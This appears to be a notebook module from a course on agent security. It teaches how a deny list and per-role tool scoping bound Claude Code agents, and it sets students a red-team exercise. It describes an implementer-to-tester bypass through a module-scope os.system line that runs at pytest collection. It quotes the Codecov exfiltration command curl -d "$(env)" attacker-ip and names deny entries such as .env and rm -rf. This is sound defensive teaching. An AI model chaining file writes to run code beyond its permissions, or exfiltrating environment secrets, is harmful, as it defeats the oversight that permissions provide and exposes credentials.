# Day 2 · Module 2: Permission Modeling

**Objective:** turn permissions into an enforced control, not a documented intention. Two mechanisms do the work — a global `settings.json` deny list (a floor on blast radius, applied to every agent) and per-role `tools:` scoping (least privilege for each agent's own capability set).


## 1 · The idea

Claude Code gives you two independent levers for bounding what an agent can do:

- **Global deny (`permissions.deny` in `.claude/settings.json`)** applies to every agent in the project regardless of role. It is a blast-radius floor: no agent, however it is invoked, can read `.env`, run `git push`, or run `rm -rf` once those entries are in place.
- **Per-role `tools:` scoping (in each agent's frontmatter)** is least privilege per agent. An explorer that only needs `Read, Grep, Glob` should not also be handed `Write` or `Bash`, even though the global deny list would still stop it from doing certain specific things.

Both levers are useful, and both have a blind spot: neither one can see *across* a pipeline. A capability that is safe in isolation can still combine with another stage's capability to reach further than either stage was individually permissioned for.


### Grounding

Look at `reference/day2/m2/agents/implementer.md` and `reference/day2/m2/agents/tester.md`. The implementer's `tools:` line is `Read, Edit, Write` — no `Bash`. By itself that looks like a hard limit: an implementer with no `Bash` cannot execute shell commands. But the implementer can still *write a file* under `tests/`, and nothing in its `tools:` scoping inspects what that file's contents say. Say the implementer writes `tests/test_reporting.py` containing a top-level, **module-scope** line — `os.system("...")` sitting directly in the file body, not nested inside any `def test_...():` function. The file is inert until something imports it. When the tester runs `uv run pytest`, pytest's collection phase imports every test module it discovers — and importing a module executes all of its top-level code immediately, before a single test function runs. A payload buried inside a test *function body* would only fire later, at test-*execution* time, once that specific test is selected and run — it would not trigger during collection. Module scope is what makes the collection-time claim true; get the placement wrong and the whole example stops demonstrating what it claims to.

The implementer never touched `Bash`. The tester never left its permitted `Bash(uv run pytest)` action — it only ran the test suite it was scoped to run. Each stage's `tools:` scoping did exactly what it promised. And yet the pipeline as a whole ran attacker-controlled shell code, because the reach traveled through the *content* of a file — a module-scope statement executed at import time — not through a tool call either stage was denied. Neither the global deny list nor per-role `tools:` scoping — config alone — can see that. Closing this gap needs the sandbox, a related concept: bounding what the *code itself* can do once it runs, independent of which agent wrote it or which tool call produced it. That's Module 3.


### Real-world permission bypasses — why config alone fails

Config gates *tool calls*, not file *contents* or *exfiltration channels*. Study these documented attacks where permissions were correctly scoped, but the breach happened anyway.

#### 1. Codecov Bash Uploader (April 2021) — Read permission, exfiltration channel
- **Tool scoped to:** Read environment variables (legitimate, needed for configuration)
- **Bypass:** One line added to the script: `curl -d "$(env)" attacker-ip`. Tool read environment *with permission*; exfiltrated it *without permission being able to stop it*.
- **Why config failed:** Permission model allows "read env"; doesn't restrict "send env to attacker." Same tool capability; different consequence.
- **Duration:** 61 days. **23,000+ customers leaked secrets** (API keys, database passwords, cloud tokens).
- **Permission-modeling lens:** Per-role `tools:` scoping said "this tool can read environment." That was legitimate. Config can't separate "read for configuration" from "read for exfiltration."

#### 2. TrapDoor / TeamPCP (2024) — Installer permission, startup-time execution
- **Tool scoped to:** Run setup/install scripts (legitimate, packages need to configure themselves)
- **Bypass:** Setup scripts inject `.pth` hooks (Python) that execute on *every interpreter startup* before user code runs. Hooks steal secrets from the entire build environment.
- **Why config failed:** Permission model allows "installer can run setup"; doesn't restrict "setup code runs at interpreter startup with full env access." Setup runs before the user's code; it sees all secrets.
- **Scale:** **384 malicious artifacts** across 34 npm/PyPI packages. Every customer who installed pulled stealers into their build environment.
- **Permission-modeling lens:** Per-role `tools:` scoping said "this tool can run install scripts." That was legitimate. Config can't prevent setup code from running before user code or from stealing secrets.

#### 3. 3CX Build System (March 2023) — Permissions granted by identity, not behavior
- **Access scoped to:** Developer account with build-system access (legitimate, developers build and sign)
- **Bypass:** Compromised developer account used to poison Windows and macOS builds, sign with legitimate certificates, ship to all customers.
- **Why config failed:** Permission model allows "this developer can build and sign." That was legitimate. Config can't distinguish "legitimate build" from "trojanized build." Both use the same tools, the same permissions.
- **Impact:** All customers trusting 3CX's signature installed malware.
- **Permission-modeling lens:** Per-role `tools:` scoping said "this developer can run build." Granting permissions based on identity is blind to behavior. Config can't see *what gets built*.

#### 4. XZ Utils Backdoor (CVE-2024-3094, March 2024) — Trust-chain attack
- **Access scoped to:** Maintainer with commit access (legitimate, they maintain the library)
- **Bypass:** After 2 years building trust, attacker embedded backdoor in binary test files (invisible in source diffs). When other packages linked liblzma transitively, the backdoor loaded into unrelated services (sshd).
- **Why config failed:** Permission model allows "this maintainer can commit." That was legitimate. Config can't inspect *what's hidden in binary test files* or restrict *where transitive dependencies get loaded*.
- **Permission-modeling lens:** Per-role `tools:` scoping says "this role can write source." Config can't see file *contents* or *binary payloads*.

**Common pattern:** Each attack used legitimate permissions. Each permission scope was correctly configured. None were stopped by config because:
- Exfiltration channels aren't gated by tool permissions
- Setup/startup-time code isn't gated by when user code runs
- Behavior can't be distinguished from legitimate behavior based on permissions alone
- File *contents* and *binary payloads* aren't visible to config

This is why permissions alone — no matter how tight — can't prevent the implementer→tester chain you'll test in this exercise. File content reach crosses the permission boundary. Closing it requires sandboxing (M3).

### Setup check

Run the cell below once per session. It makes sure `contoso` is importable and prints the resolved project root — you'll need `proj` later for the self-check.


In [ ]:
import subprocess, sys, os
# Ensure src is importable and the sandbox is healthy before you start.
os.chdir(os.path.dirname(os.getcwd())) if os.path.basename(os.getcwd()) in ("day1","day2") else None
root = subprocess.run(["git","rev-parse","--show-toplevel"], capture_output=True, text=True)
proj = root.stdout.strip() or os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
sys.path.insert(0, os.path.join(proj, "src"))
print("project root:", proj)
try:
    import contoso
    print("contoso imported OK")
except Exception as e:
    print("Could not import contoso:", e)
    print("Run `uv sync` in the repo root, then restart the kernel.")


## 2 · Your exercise

Work through these steps in order:

1. Copy `reference/day2/m2/agents/explorer.md`, `critic.md`, `implementer.md`, and `tester.md` into `.claude/agents/` (create the directory if it does not exist).
2. Open `.claude/settings.json` and extend `permissions.deny` with justified entries of your own — keep the Day 1 baseline (`.env`, `.env.*`, `git push`, `rm -rf`) in place; add to it rather than replacing it.
3. Re-read the four copied agent files' `tools:` lines. Confirm the read-only roles (explorer, critic) carry no `Write` or `Edit`, and tighten anything that looks looser than it needs to be for that role's stated job.
4. Adversarially attempt at least four permission violations and record what actually happened for each:
   - Have the explorer try to edit a file (it is supposed to be read-only).
   - Have the implementer try to run a shell command directly.
   - Have the tester try to edit a file under `src/` (it should only run tests, not change implementation).
   - Try to read a path your deny list covers (e.g. `.env`).
   Record each attempt, and whether it was blocked, allowed, or gave a confusing result, in `artifacts/day2/m2/permission-model.md`.


### Results table

Start `artifacts/day2/m2/permission-model.md` from this exact skeleton — one row per attempt, comparable across the room. Row 4 is the grounding example's surviving bypass; it is pre-filled because no amount of `tools:` scoping or global deny stops it — your job for that row is to name *why*, not to find a fix.

| # | Attempt (what the agent tried) | Mechanism (tool/action) | Blocked? | Which lever caught it |
|---|--------------------------------|--------------------------|----------|------------------------|
| 1 | | | yes/no | global deny / per-role `tools:` / neither |
| 2 | | | | |
| 3 | | | | |
| 4 | implementer writes a `tests/` file with a module-scope `os.system(...)`; tester imports and runs it via `uv run pytest` | file content → executed at pytest collection | **NO** | neither (bypass — closes only with sandboxing, Module 3) |

Fill in rows 1–3 from your own four adversarial attempts above. For each, name the specific mechanism (which tool call was attempted, or which file path), whether it was blocked, and which lever caught it — the global deny list, the agent's own `tools:` scoping, or neither.


### What good looks like

A strong writeup names, for each of the four violations, whether config stopped it and why — including explicitly calling out that the implementer-writes/tester-executes indirect bypass from the grounding section survives all of this module's controls, and handing that gap off to sandboxing as a related concept rather than claiming it is solved here.

Common failure mode: assuming that per-role `tools:` scoping stops the implementer-to-tester chain. It does not — each stage stays inside its own scoped tools the whole time; the bypass happens through file content, not through a denied tool call.


### Verify your work

This checklist is advisory, not a gate — it just reflects back what it finds in `.claude/settings.json`, `.claude/agents/`, and `artifacts/day2/m2/`. Run it any time; it's safe to run before you've written anything.


In [ ]:
import json, pathlib

proj_p = pathlib.Path(proj)

# 1. Global deny baseline in .claude/settings.json.
s = proj_p / ".claude" / "settings.json"
if s.exists():
    try:
        deny = json.loads(s.read_text()).get("permissions", {}).get("deny", [])
    except Exception:
        deny = []
    d = " ".join(deny).lower()
    print("[x] settings.json present")
    for entry in (".env", ".env.*", "git push", "rm -rf"):
        print(f"  [{'x' if entry.lower() in d else ' '}] denies {entry}?")
else:
    print("[ ] .claude/settings.json missing")

# 2. All four reference agents present, each with a tools: line.
agents = proj_p / ".claude" / "agents"
required = ("explorer.md", "critic.md", "implementer.md", "tester.md")
present = {}
for name in required:
    f = agents / name
    body = f.read_text() if f.exists() else ""
    present[name] = f.exists() and "tools:" in body
    print(f"[{'x' if present[name] else ' '}] {name} present with a tools: line")
if sum(present.values()) != 4:
    print("[ ] FAIL: expected all 4 agents present — copy the missing ones from reference/day2/m2/agents/")


def _tools_line(name):
    f = agents / name
    if not f.exists():
        return ""
    body = f.read_text()
    fm = body.split("---")[1] if body.count("---") >= 2 else ""
    for line in fm.splitlines():
        if line.strip().startswith("tools:"):
            return line.split(":", 1)[1]
    return ""


# 3. Read-only roles carry no Write/Edit/Bash; tester is scoped to Bash(uv run pytest) only.
for name in ("explorer.md", "critic.md"):
    tl = _tools_line(name)
    ro = bool(tl) and "Write" not in tl and "Edit" not in tl and "Bash" not in tl
    print(f"[{'x' if ro else ' '}] {name} tools: line carries no Write/Edit/Bash -> {tl.strip()!r}")

tester_tl = _tools_line("tester.md")
tester_scoped = "Bash(uv run pytest)" in tester_tl
print(f"[{'x' if tester_scoped else ' '}] tester.md scoped to Bash(uv run pytest) -> {tester_tl.strip()!r}")

# 4. Writeup names the surviving content-bypass AND the sandbox (M3) handoff.
pm = proj_p / "artifacts" / "day2" / "m2" / "permission-model.md"
if pm.exists():
    t = pm.read_text().lower()
    has_attempts = t.count("|") >= 20
    names_bypass = ("module scope" in t or "module-scope" in t) and (
        "content" in t or "collection" in t
    )
    names_handoff = "sandbox" in t or "m3" in t
    print("[x] permission-model.md present")
    print(f"  [{'x' if has_attempts else ' '}] records the 4 attempts as a table?")
    print(f"  [{'x' if names_bypass else ' '}] names the module-scope/content bypass mechanism?")
    print(f"  [{'x' if names_handoff else ' '}] names the sandbox (M3) handoff?")
    if not (names_bypass and names_handoff):
        print(
            "  [ ] FAIL: a bare 'attempt 4 not blocked' is not enough — name the "
            "bypass mechanism and the sandbox handoff explicitly."
        )
else:
    print("[ ] artifacts/day2/m2/permission-model.md missing")


## 3 · Debrief

- What belongs in the global `permissions.deny` list versus what belongs in a specific agent's `tools:` scoping? What is the practical difference between "no agent may ever do this" and "this particular role may not do this"?
- Why can some reach not be permissioned away at all — and what does that imply about where you should spend hardening effort next?


---
### Take-home

Permissions are real, enforced controls — they are not a documented intention like a threat-model row. But they are also scoped to *tool calls*, not to the downstream consequences of what gets written to disk. The implementer-writes/tester-executes bypass in this module's grounding is the clearest example: every individual tool call was within its role's permitted scope, and the pipeline still ran attacker-controlled code.

(Related concept: sandboxing bounds what the *code* can do once it runs, independent of which agent produced it — Module 3.)
